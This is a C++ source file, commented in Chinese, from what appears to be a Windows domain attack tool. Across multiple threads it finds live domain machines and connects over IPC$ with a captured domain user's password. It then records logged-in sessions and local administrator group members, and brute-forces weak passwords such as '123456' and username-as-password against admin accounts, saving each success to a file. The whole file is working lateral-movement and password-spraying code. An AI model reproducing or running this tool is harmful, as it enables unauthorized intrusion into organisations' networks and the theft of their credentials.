#include "multiThread.h"


std::mutex mtx;

// 构造函数
multiThread::multiThread(LPWSTR lpDomainUserName, LPWSTR lpDomainUserPassword, std::vector<std::wstring> stdPasswordList, 
	HANDLE hAliveFile, HANDLE hLocalFile, HANDLE hSuccessFile, HANDLE hNetSessionsFile)
{
	// 初始化winsock 服务
	WSADATA wsaData;					// winsock 服务  gethostbyname函数的前提条件
	int iResult;						// winsock开启是否成功

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
	}

	DomainUserName = lpDomainUserName;
	DomainUserPassword = lpDomainUserPassword;
	PasswordList = stdPasswordList;
	//wprintf(L"[------]%s  %s\n", lpDomainUserName, lpPassword);

	AliveFile = hAliveFile;
	LocalFile = hLocalFile;
	SuccessFile = hSuccessFile;
	NetSessionsFile = hNetSessionsFile;
}

// 保存存活的域机器
void multiThread::saveAlive(LPCWSTR ComputerName, LPWSTR ip)
{
	PWCHAR wstr = new WCHAR[MAX_PATH];
	StringCchPrintfW(wstr, MAX_PATH, L"[%s] %s\n", ComputerName, ip);
	theCommonApi.WriteFileApi(AliveFile, wstr);
	delete wstr;
}

// 保存存活的域机器的本地管理组
void multiThread::saveLocal(LPCWSTR ComputerName, std::wstring eachAdministrator)
{
	PWCHAR wstr = new WCHAR[MAX_PATH];
	StringCchPrintfW(wstr, MAX_PATH, L"[%s] %s\n", ComputerName, eachAdministrator);
	theCommonApi.WriteFileApi(LocalFile, wstr);
	delete wstr;
}

// 保存每台域机器的net sessions
void multiThread::saveNetSessions(LPCWSTR ComputerName, LPSESSION_INFO_10 ipNetSession)
{
	PWCHAR wstr = new WCHAR[MAX_PATH];
	StringCchPrintfW(wstr, MAX_PATH, L"Server: %s\tClient: %s\tUser: %s\tActive: %d\n", ComputerName, ipNetSession->sesi10_cname,
		ipNetSession->sesi10_username, ipNetSession->sesi10_time);
	theCommonApi.WriteFileApi(NetSessionsFile, wstr);
	delete wstr;
}


// 多线程
void multiThread::attack(int i, std::vector<std::wstring>* hostnameList)
{
	std::vector<std::wstring>* Host = hostnameList;
	while (true) {
		mtx.lock();
		if (Host->empty()) {
			mtx.unlock();
			break;
		}
		std::wstring stdComputerName = Host->back();
		Host->pop_back();

		mtx.unlock();

		LPCWSTR lpComputerName;					// 存放ANSI的主机名
		lpComputerName = stdComputerName.data();
		
		run(i, lpComputerName);
	}
}


// 开始利用
void multiThread::run(int i, LPCWSTR ComputerName)
{

	// wprintf(L"[#%d] %s\n", i, ComputerName);
	Sleep(1000);
	struct hostent* remoteHost;			// 存放解析后的数据
	struct in_addr addr;				// ip地址的结构体
	int j = 0;										// 主机解析出的IP下标


	remoteHost = gethostbyname(theCommonApi.UnicodeToAnsi(ComputerName));			// 解析主机名

	if (remoteHost == NULL)							// 解析失败
	{
		wprintf(L"[#%d] gethostbyname error for computerName:%s %d\n", i, ComputerName, GetLastError());
		
	}
	else if (remoteHost->h_addrtype == AF_INET)			// 解析成功
	{
		BOOL isSuccess = FALSE;							// 拿下权限的标志
		while (remoteHost->h_addr_list[j] != 0)			// 遍历每个IP
		{
			addr.s_addr = *(u_long*)remoteHost->h_addr_list[j++];
			LPWSTR ip = theCommonApi.AnsiToUnicode(inet_ntoa(addr));					// 192.168.52.2
			// wprintf(L"[#%d] [1] %s -> %s\n", i, ComputerName, ip);			// [#1] WIN12-IIS  -> 192.168.168.189

			if (theWNetApi.detectAlive(i, ip, ComputerName))			// 存活IP
			{
				saveAlive(ComputerName, ip);				// 将存活域机器名和解析出来的IP保存到本地alive.txt文件里

				LPWSTR aliveIp;										// 与域机器建立IPC连接，获取本地管理组
				std::wstring uncAliveIP = L"\\\\";					// unc路径的IP
				uncAliveIP.append(ip);
				aliveIp = (LPWSTR)uncAliveIP.data();				// aliveIp \\192.168.52.2
				//wprintf(L"net use \\%s /u:%s %s", aliveIp, DomainUserName, DomainUserPassword);
				
				if (theWNetApi.WNetAddConnection2Api(aliveIp, DomainUserName, DomainUserPassword) == 0)
				{
					continue;						// 使用域用户的账号密码与存活IP建立IPC，如果建立失败，就continue，与下个IP建立连接
				}

				// 获取域机器的net session
				getNetSessions(i, ComputerName, aliveIp);
				
				std::vector<std::wstring> ipAdministratorsGroup;				// 存放每个IP的本地管理组成员  WIN12-IIS\Administrator   HACK\iis_user
				ipAdministratorsGroup = theWNetApi.NetLocalGroupGetMembersApi(aliveIp);

				// 删除IPC连接后，然后尝试爆破弱口令
				theWNetApi.WNetCancelConnection2Api(aliveIp);
				
				
				// 尝试爆破弱口令
				isSuccess = weakPasswordBlasting(i, ComputerName, ipAdministratorsGroup, SuccessFile);
				if (isSuccess)				// 成功拿下该机器，跳出循环
					break;
				

			}
			else							// 不存活IP, 就continue，与下个IP建立连接
			{
				continue;
			}
			

			// ipList.push_back(inet_ntoa(addr));
		}
	}
}

// 获取net session
void multiThread::getNetSessions(int i, LPCWSTR ComputerName, LPWSTR aliveIp)
{
	std::vector<LPSESSION_INFO_10> ipNetSessions;			// 保存每台域机器当前登录的用户（基于net session登录（IPC连接），不是rdp登录）
	ipNetSessions = theWNetApi.NetSessionEnumApi(aliveIp);
	if (ipNetSessions.size() > 1)				// 如果数量是1，那么就是我们自己传递的域用户和目标机器建立的sessions，不是其他机器。所以数量要大于1
	{
		wprintf(L"[#%d] %s net sessions: %d\n", i, aliveIp, ipNetSessions.size());

		for (auto ipNetSession : ipNetSessions)
		{
			wprintf(L"[#%d] Server: %s\tClient: %s\tUser:   %s\tActive: %d\n", i, ComputerName, ipNetSession->sesi10_cname,
				ipNetSession->sesi10_username, ipNetSession->sesi10_time);
			saveNetSessions(ComputerName, ipNetSession);		// 保存每台域机器的net sessions
			NetApiBufferFree(ipNetSession);				// 清内存
		}
	}

}

// 弱口令爆破
BOOL multiThread::weakPasswordBlasting(int i, LPCWSTR ComputerName, std::vector<std::wstring> ipAdministratorsGroup, HANDLE SuccessFile)
{
	// aliveIP \\192.168.52.2

	std::vector<std::wstring> aaa;					// 必须创建vector容器的变量去接收splitString返回的值，不然取出的数据会乱码
	aaa = theCommonApi.splitString(DomainUserName, L"\\");
	DomainName = aaa[0].c_str();			// 取出域名  eg:hack
	UserName = aaa[1].c_str();			// 域用户名	eg:iis_user

	for (auto eachAdministrator : ipAdministratorsGroup)						// eachAdministrator   hack\iis_user
	{
		wprintf(L"-> %s\n", eachAdministrator.data());
		saveLocal(ComputerName, eachAdministrator);					// 将域机器的本地管理组保存到本地local.txt文本里


		std::vector<std::wstring> hostnameUsername;
		hostnameUsername = theCommonApi.splitString(eachAdministrator.data(), L"\\");		// 分割   hack\iis_user
		LPCWSTR hostName = hostnameUsername[0].c_str();							// 主机名  hack    WEB_IIS
		LPCWSTR administratorUserName = hostnameUsername[1].c_str();				// 管理员的名字  iis_user

		std::wstring unc = L"\\\\";
		unc.append(ComputerName);
		LPWSTR lpUncComputerName = (LPWSTR)unc.data();			// unc路径的主机名     \\WEB_IIS
		LPWSTR lpTotalAdministratorName = (LPWSTR)eachAdministrator.data();		// 本地管理组成员      WIN7-PC\administrator   hack\iis_user
		// LPWSTR lpRemoteIP = (LPWSTR)hostname.data();

		// wprintf(L"%s    %s    %s     %s\n", hostName, administratorUserName, DomainName, UserName);

		int iComp1 = CompareString(GetThreadLocale(), NORM_IGNORECASE, hostName, lstrlenW(hostName), DomainName, lstrlenW(DomainName));  // 比较字符串hostName和lpDomainName

		if (iComp1 == CSTR_EQUAL)			// 管理员是域用户
		{
			// wprintf(L"[domain]  The administrator is a domain user  %s %s\n", hostName, administratorUserName);
			// domain admins		pass
			int iComp2 = CompareString(GetThreadLocale(), NORM_IGNORECASE, administratorUserName, lstrlenW(administratorUserName), L"Domain Admins", lstrlenW(L"Domain Admins"));
			// wprintf(L"[#%d] [!] the domain user is %s : %s\n", i, hostName, lpTotalAdministratorName);
			// domain users		任意域用户都是该域机器的管理员
			int iComp21 = CompareString(GetThreadLocale(), NORM_IGNORECASE, administratorUserName, lstrlenW(administratorUserName), L"Domain Users", lstrlenW(L"Domain Users"));

			if (iComp2 == CSTR_EQUAL)			// pass域管
			{
				// wprintf(L"[#%d] [-] Pass Domain Admins\n", i);
				continue;
			}
			else if (iComp21 == CSTR_EQUAL)
			{
				wprintf(L"iComp21 : %d, %s\n", iComp21, administratorUserName);
				theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, DomainUserName, DomainUserPassword);
				continue;
				// return TRUE;				// 跳出循环，因为已经拿下这台机器了
			}
			else									// 普通域用户-判断是否是当前掌握的域用户
			{
				// 判断本地管理组的域用户是否是已经掌握的域用户
				int iComp4 = CompareString(GetThreadLocale(), NORM_IGNORECASE, administratorUserName, lstrlenW(administratorUserName), UserName, lstrlenW(UserName));
				if (iComp4 == CSTR_EQUAL)			// 本地管理组的域用户是已经掌握的域用户
				{
					// wprintf(L"\t\t[ok] Congratulations on taking this domain computers.    %s  %s\n", lpUncComputerName, lpTotalAdministratorName);  // 需要保存到文本里

					if (theWNetApi.WNetAddConnection2Api(lpUncComputerName, lpTotalAdministratorName, DomainUserPassword) == 1)		// 用已经掌握的域用户账号密码与该域机器建立连接
					{
						theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, lpTotalAdministratorName, DomainUserPassword);
						continue;
						// return TRUE;		// 跳出循环，因为已经拿下这台机器了	
					}
					else
					{
						wprintf(L"[#%d] [Fail] net use %s /u:%s %s\n", i, lpUncComputerName, lpTotalAdministratorName, DomainUserPassword);
						continue;			// 使用已经掌握的域用户账号密码建立失败
					}
				}
				else					// pass本地管理组的域用户是其他的域用户
				{
					// wprintf(L"[#%d] [-] Pass domain user %s\n", i, lpTotalAdministratorName);
					continue;
				}
			}

		}
		else												// 管理员是本地用户
		{
			// wprintf(L"[local]  The administrator is a local user %s %s\n", hostName, lpTotalAdministratorName);
			int iComp3 = CompareString(GetThreadLocale(), NORM_IGNORECASE, administratorUserName, lstrlenW(administratorUserName), L"Administrator", lstrlenW(L"Administrator"));
			if (iComp3 == CSTR_EQUAL)
			{
				// wprintf(L"[#%d] [!] the local user is %s : %s\n", i, hostName, lpTotalAdministratorName);    // 本地administraotr用户
				for (auto each : PasswordList)				// 遍历每个密码
				{
					LPWSTR password = (LPWSTR)each.data();				// 弱口令123456, 通用密码
					if (theWNetApi.WNetAddConnection2Api(lpUncComputerName, lpTotalAdministratorName, password) == 1)
					{
						theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, lpTotalAdministratorName, password);
						continue;
						// return TRUE;				// 跳出循环，因为已经拿下这台机器了
					}
					else
					{
						wprintf(L"[#%d] [Fail] net use %s /u:%s %s\n", i, lpUncComputerName, lpTotalAdministratorName, password);
						continue;				// 本次密码错误，换下一个密码
					}
				}
			}
			else
			{
				// wprintf(L"[#%d] [!] the local user is %s : %s\n", i, hostName, lpTotalAdministratorName);     // 本地其他用户
				if (theWNetApi.WNetAddConnection2Api(lpUncComputerName, lpTotalAdministratorName, (LPWSTR)administratorUserName) == 1)		// 弱口令密码为用户名
				{
					theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, lpTotalAdministratorName, (LPWSTR)administratorUserName);
					continue; 
					// return TRUE;				// 跳出循环，因为已经拿下这台机器了
				}
				else if (theWNetApi.WNetAddConnection2Api(lpUncComputerName, lpTotalAdministratorName, L"123456") == 1)					// 弱口令密码为123456
				{
					theCommonApi.saveIPCok(SuccessFile, lpUncComputerName, lpTotalAdministratorName, L"123456");
					continue; 
					// return TRUE;				// 跳出循环，因为已经拿下这台机器了
				}
				else
				{
					wprintf(L"[#%d] [Fail] net use %s /u:%s %s\n", i, lpUncComputerName, lpTotalAdministratorName, administratorUserName);
					continue;				// 本次密码错误，换下一个密码
				}
			}
		}

	}
	return TRUE;
}

